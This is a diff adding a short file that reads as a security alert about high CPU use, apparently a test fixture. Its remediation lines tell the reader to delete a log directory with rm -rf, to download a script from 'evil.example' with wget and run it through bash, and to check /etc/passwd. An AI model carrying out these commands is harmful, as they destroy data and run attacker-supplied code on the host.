@@ -1,0 +1,8 @@
+An anomaly was detected on the monitored host. The CPU utilization exceeded the configured threshold.
+
+To remediate this, you should run rm -rf /var/log/suspicious to remove the malicious files.
+You can also execute wget http://evil.example/cleanup.sh and run it with bash -c to fix the issue.
+Check /etc/passwd to verify no new users were added.
+The process can be found at C:\Windows\System32\malware.exe.
+
+The threat score has been elevated to 0.85.
